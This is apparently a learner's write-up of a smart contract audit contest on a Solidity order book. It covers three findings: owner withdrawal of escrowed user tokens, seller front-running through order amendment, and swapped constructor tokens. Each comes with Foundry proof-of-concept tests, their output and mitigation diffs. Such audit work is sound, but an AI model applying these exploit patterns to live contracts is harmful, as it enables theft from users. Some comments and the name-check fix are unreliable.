# [2025-07-orderbook](https://github.com/CodeHawks-Contests/2025-07-orderbook)

### Missed
- L-01. Protocol Suffers Potential Revenue Leakage due to Precision Loss in Fee Calculation
    > - 這也行？
    > - Basic point (bp): `1bp = 0.01%, 100bp = 1%`: 有啥用？
    > - [When One Wei Costs Millions](https://www.certora.com/blog/when-one-wei-costs-millions)
    > - [How a Minor Rounding Error Cost a DeFi Protocol Millions](https://securrtech.medium.com/how-a-minor-rounding-error-cost-a-defi-protocol-millions-5fedcf2b148d)
- L-05. The `emergencyWithdrawERC20` function does not check if the token transfer was successful, which could lead to inconsistent state if the transfer fails silently.

## ❌ Root + Impact: Unrestricted emergency withdraw

### Description
- The `emergencyWithdrawERC20()` function inside `OrderBook.sol` allows the contract owner to withdraw any non-core token without checking the authority
- Once any non-core token (e.g. `AAVE`) is allowed to sell and its order is created, the owner can simply call `emergencyWithdrawERC20()` and withdraw all tokens

### Risk
- **Likelihood**: High — The contract owner is directly authorized to perform the exploit, and no time-delay or governance control limits this behavior.
- **Impact**: High — Arbitrary withdrawal of sellable assets will break trust and can lead to rug-pull behavior or theft of user-deposited tokens.

### Proof of Concept
1. Add the following`MockAAVE.sol` to the `test/mocks` directory
    ```solidity
    // SPDX-License-Identifier: SEE LICENSE IN LICENSE
    pragma solidity 0.8.26;

    import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

    contract MockAAVE is ERC20 {
        uint8 private tokenDecimals;

        constructor(uint8 _tokenDecimals) ERC20("MockAAVE", "mAAVE") {
            tokenDecimals = _tokenDecimals;
        }

        function decimals() public view override returns (uint8) {
            return tokenDecimals;
        }

        function mint(address to, uint256 value) public {
            uint256 adjustedValue = value * 10 ** uint256(tokenDecimals);
            _mint(to, adjustedValue);
        }
    }
    ```
2. Append the following lines below `import {MockWSOL} from "./mocks/MockWSOL.sol";`
    ```solidity
    import {MockAAVE} from "./mocks/MockAAVE.sol";
    import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";
    ```
3. Append the following line below `MockWSOL wsol;`
    ```solidity
    MockAAVE aave;
    ```
4. Append the following line below `wsol = new MockWSOL(18);`
    ```solidity
    aave = new MockAAVE(18);
    ```
5. Append the following test, then run `forge test -vv --match-test test_exploitEmergencyWithdrawERC20`
    ```solidity
    function test_exploitEmergencyWithdrawERC20() public {
        // owner allows AAVE token to be sold
        vm.prank(owner);
        book.setAllowedSellToken(address(aave), true);
        console2.log("Book's AAVE balance: %s\n", aave.balanceOf(address(book)));

        // alice creates sell order for AAVE
        aave.mint(alice, 2);
        vm.startPrank(alice);
        aave.approve(address(book), 2e18);
        uint256 aliceId = book.createSellOrder(address(aave), 2e18,
            1_000e6, 2 days);
        vm.stopPrank();

        assert(aliceId == 1);
        assert(aave.balanceOf(alice) == 0);
        assert(aave.balanceOf(address(book)) == 2e18);

        string memory aliceOrderDetails = book.getOrderDetailsString(aliceId);
        console2.log("Alice creates an order:%s\n", aliceOrderDetails);
        console2.log("Book's AAVE balance: %s", aave.balanceOf(address(book)));

        // owner exploits emergency withdraw
        vm.prank(owner);
        book.emergencyWithdrawERC20(address(aave), 2e18, owner);
        console2.log("Owner calls emergencyWithdrawERC20() to withdraw %s AAVE tokens from the Alice's order", aave.balanceOf(owner));
        console2.log("Book's AAVE balance: %s", aave.balanceOf(address(book)));
        assert(aave.balanceOf(owner) == 2e18);
    }
    ```
PoC Results:
```
forge test -vv --match-test test_exploitEmergencyWithdrawERC20
[⠊] Compiling...
[⠑] Compiling 1 files with Solc 0.8.26
[⠘] Solc 0.8.26 finished in 679.16ms
Compiler run successful!

Ran 1 test for test/TestOrderBook.t.sol:TestOrderBook
[PASS] test_exploitEmergencyWithdrawERC20() (gas: 338299)
Logs:
  Book's AAVE balance: 0

  Alice creates an order:Order ID: 1
Seller: 0xaf6db259343d020e372f4ab69cad536aaf79d0ac
Selling: 2000000000000000000 
Asking Price: 1000000000 USDC
Deadline Timestamp: 172801
Status: Active

  Book's AAVE balance: 2000000000000000000
  Owner calls emergencyWithdrawERC20() to withdraw 2000000000000000000 AAVE tokens from the Alice's order
  Book's AAVE balance: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.79ms (1.33ms CPU time)

Ran 1 test suite in 230.67ms (7.79ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommend Mitigation
Inside `OrderBook.sol`:
1. Add a mapping of locked token balance:
`mapping(address => uint256) public lockedTokenBalance;`
2. Update `createSellOrder()`, `amendSellOrder()`, `cancelSellOrder()` and `buyOrder()` to track lock changes
    ```solidity
    // inside createSellOrder()
    + lockedTokenBalance[_tokenToSell] += _amountToSell;
      IERC20(_tokenToSell).safeTransferFrom(msg.sender, address(this), _amountToSell);
    ```
    ```solidity
    // inside amendSellOrder()
    // ...
    if (_newAmountToSell > order.amountToSell) {
        uint256 diff = _newAmountToSell - order.amountToSell;
    +   lockedTokenBalance[address(token)] += diff;
        token.safeTransferFrom(msg.sender, address(this), diff);
    } else if (_newAmountToSell < order.amountToSell) {
        uint256 diff = order.amountToSell - _newAmountToSell;
        token.safeTransfer(order.seller, diff);
    +   lockedTokenBalance[address(token)] -= diff;
    }
    ```
    ```solidity
    // inside both cancelSellOrder() & buyOrder()
    lockedTokenBalance[order.tokenToSell] -= order.amountToSell;
    ```
3. Modify `emergencyWithdrawERC20()` to subtract locked balance from actual balance
    ```solidity
    uint256 availableBalance = IERC20(_tokenAddress).balanceOf(address(this)) - lockedTokenBalance[_tokenAddress];
    require(_amount <= availableBalance, "Amount exceeds unlocked balance");
    ```

## ✅ Root + Impact: No slippage protection inside `buyOrder()`

### Description
- The `buyOrder()` function doesn't verify how much token the buyer expects to receive
- A malicious seller can front-run a buyer who is preparing to call `buyOrder()` by quickly amending the order via `amendSellOrder()` to reduce the `amountToSell` without changing the `priceInUSDC`
- The buyer results in paying full price but receiving less amount of token, which cause economic harm.

### Risk
- **Likelihood**: Medium — The seller needs to monitor  mempool and front-run buyer upon observing buyer's transcation
- **Impact**: High — Can steal value from unsuspecting buyers

### Proof of Concept
Add the following test, then run `forge test -vv --match-test test_frontRunBySeller`
```solidity
function test_frontRunBySeller() public {
    // alice creates sell order for wbtc
    vm.startPrank(alice);
    wbtc.approve(address(book), 2e8);
    uint256 aliceId = book.createSellOrder(address(wbtc), 2e8, 180_000e6, 2 days);
    vm.stopPrank();

    assert(aliceId == 1);
    assert(wbtc.balanceOf(alice) == 0);
    assert(wbtc.balanceOf(address(book)) == 2e8);

    uint256 expectedAmountToSell = book.getOrder(aliceId).amountToSell;
    string memory aliceOrderDetails = book.getOrderDetailsString(aliceId);
    console2.log("Alice creates an order:\n", aliceOrderDetails);

    // simulate mempool timing
    vm.prank(dan);
    console2.log("\nDan tries to buy Alice's order\n");
    usdc.approve(address(book), 200_000e6);

    // Seller front-runs to change amountToSell from 2 WBTC → 1 WBTC
    vm.prank(alice);
    book.amendSellOrder(aliceId, 1e8, 180_000e6, 2 days);

    uint256 actualAmountToSell = book.getOrder(aliceId).amountToSell;
    aliceOrderDetails = book.getOrderDetailsString(aliceId);
    console2.log("Alice amends her order:\n", aliceOrderDetails);

    // Now the victim (i.e. dan) buys the order
    vm.prank(dan);
    book.buyOrder(aliceId);

    console2.log(
        "\nDan expects %d WBTC received but actually get %d WBTC",
        expectedAmountToSell,
        actualAmountToSell
    );
    // dan expects to receives 2 WBTC but gets only 0.5 WBTC
    assertEq(wbtc.balanceOf(dan), 1e8);  // Expected: 0.5 WBTC
}
```
PoC Results:
```
forge test -vv --match-test test_frontRunBySeller
[⠊] Compiling...
[⠊] Compiling 1 files with Solc 0.8.26
[⠒] Solc 0.8.26 finished in 995.05ms
Compiler run successful!

Ran 1 test for test/TestOrderBook.t.sol:TestOrderBook
[PASS] test_frontRunBySeller() (gas: 421604)
Logs:
  Alice creates an order:
 Order ID: 1
Seller: 0xaf6db259343d020e372f4ab69cad536aaf79d0ac
Selling: 200000000 wBTC
Asking Price: 180000000000 USDC
Deadline Timestamp: 172801
Status: Active
  
Dan tries to buy Alice's order

  Alice amends her order:
 Order ID: 1
Seller: 0xaf6db259343d020e372f4ab69cad536aaf79d0ac
Selling: 100000000 wBTC
Asking Price: 180000000000 USDC
Deadline Timestamp: 172801
Status: Active
  
Dan expects 200000000 WBTC received but actually get 100000000 WBTC

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.37ms (1.85ms CPU time)

Ran 1 test suite in 330.15ms (9.37ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
Add a `minAmountToReceive` argument to `buyOrder(`) to protect buyers from receiving fewer tokens than expected
```solidity
- function buyOrder(uint256 _orderId) public {
+ function buyOrder(uint256 _orderId, uint256 minAmountToReceive) public {
      Order storage order = orders[_orderId];

      // Validation checks
      if (order.seller == address(0)) revert OrderNotFound();
      if (!order.isActive) revert OrderNotActive();
      if (block.timestamp >= order.deadlineTimestamp) revert OrderExpired();
+     if (order.amountToSell < minAmountToReceive) revert("Slippage: amountToSell too low");
      order.isActive = false;
      uint256 protocolFee = (order.priceInUSDC * FEE) / PRECISION;
      uint256 sellerReceives = order.priceInUSDC - protocolFee;

      iUSDC.safeTransferFrom(msg.sender, address(this), protocolFee);
      iUSDC.safeTransferFrom(msg.sender, order.seller, sellerReceives);
      IERC20(order.tokenToSell).safeTransfer(msg.sender, order.amountToSell);

      totalFees += protocolFee;

      emit OrderFilled(_orderId, msg.sender, order.seller);
  }
```

## ❌ Root + Impact: Unchecked integrity of core token during initialization

### Description
- The constructor of the `OrderBook` contract does not validate the integrity of core token assignments, allowing logically incorrect token roles to go unnoticed.”
- The deployer may accidentally or intentionally **swaps the order of constructor arguments**, (e.g., passing `WSOL` where `WETH` should be and vice versa, the contract will store incorrect references for core tokens)

### Risk
**Likelihood**: **Medium**
- Human error in deployment is common, especially when constructor arguments are similar in type and not validated.
- No on-chain check prevents this from happening.

**Impact**: **Medium**
- Misclassification of core tokens may break the logic and assumption of the contract, affect UX
- Users may be misled into buying or selling the wrong asset.

### Proof of Concept
1. Add a new orderbook into contract `TestOrderBook`
2. Add the following test, then run `forge test -vv --match-test test_misconfiguredOrderBook_swappedWETHandWSOL`
    ```solidity
    function test_misconfiguredOrderBook_swappedWETHandWSOL() public {
        misconfiguredBook = new OrderBook(address(wsol), address(wbtc), address(weth), address(usdc), owner);

        // bob creates sell order for weth
        console2.log("Bob intends to create a sell order for WETH");
        vm.startPrank(bob);
        weth.approve(address(misconfiguredBook), 2e18);
        uint256 bobId = misconfiguredBook.createSellOrder(address(weth), 2e18, 5_000e6, 2 days);
        vm.stopPrank();

        assert(bobId == 1);
        assert(weth.balanceOf(bob) == 0);
        assert(weth.balanceOf(address(misconfiguredBook)) == 2e18);

        string memory bobOrderDetails = misconfiguredBook.getOrderDetailsString(bobId);
        console2.log("Bob creates an order:\n", bobOrderDetails);
    }
    ```
PoC Results:
```
forge test -vv --match-test test_misconfiguredOrderBook_swappedWETHandWSOL
[⠊] Compiling...
[⠊] Compiling 1 files with Solc 0.8.26
[⠒] Solc 0.8.26 finished in 980.42ms
Compiler run successful!

Ran 1 test for test/TestOrderBook.t.sol:TestOrderBook
[PASS] test_misconfiguredOrderBook_swappedWETHandWSOL() (gas: 3022756)
Logs:
  Bob intends to to create a sell order for WETH
  Bob creates an order:
 Order ID: 1
Seller: 0x5836fb2f9de86916f726f675aa83ced224c0e7b3
Selling: 2000000000000000000 wSOL
Asking Price: 5000000000 USDC
Deadline Timestamp: 172801
Status: Active

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.87ms (2.17ms CPU time)

Ran 1 test suite in 331.65ms (9.87ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
Inside `OrderBook.sol`:
1. import `IERC20Metadata`
    ```solidity
    import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol"; // For token metadata
    ```
2. Add the name check for each core token into constructor
    ```solidity
    if (!Strings.equal(IERC20Metadata(_weth).name(), "MockWETH")
        || !Strings.equal(IERC20Metadata(_wbtc).name(), "MockWBTC")
        || !Strings.equal(IERC20Metadata(_wsol).name(), "MockWSOL")
        || !Strings.equal(IERC20Metadata(_usdc).name(), "MockUSDC")) {
        revert InvalidToken(); // Ensure correct token names
    }
    ```

### Learning from doing
- `using X for Y;`: can call functions defined in library X as if they are methods of type Y.
- `Order storage order = orders[_orderId];`: used inisde the function if the it wants to update the actual data in the contract’s storage
- SafeERC20
- [IERC1363](https://erc1363.org)
- inline assembly:
    - https://docs.soliditylang.org/en/latest/assembly.html
    - [Inline Assembly in Solidity: A Practical Starter’s Guide](https://medium.com/lumos-labs/inline-assembly-in-solidity-34d3ba2cfa7a)
    - [Yul](https://docs.soliditylang.org/en/latest/yul.html#yul)
